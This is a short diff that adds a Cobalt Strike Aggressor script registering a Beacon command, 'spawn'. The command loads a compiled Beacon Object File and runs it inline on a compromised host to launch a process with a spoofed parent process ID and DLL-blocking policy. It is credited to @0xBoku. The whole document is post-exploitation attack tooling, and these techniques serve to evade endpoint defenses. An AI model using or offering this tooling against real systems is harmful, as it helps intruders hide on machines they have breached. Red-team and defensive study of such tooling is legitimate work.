@@ -1,0 +1,21 @@
+beacon_command_register(
+    "spawn", 
+    "Spawn a process with a spoofed PPID and blockDll", 
+    "Synopsis: spawn /path/to/exe PPID"
+);
+
+alias spawn {
+    if(size(@_) != 3)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("spawn"));
+        return;
+    }
+    local('$handle $data $args');
+    $handle = openf(script_resource("spawn.x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    $args = bof_pack($1,"zi",$2,$3);
+    btask($1, "SPAWN (@0xBoku|github.com/boku7)");
+    beacon_inline_execute($1, $data, "go", $args);
+}
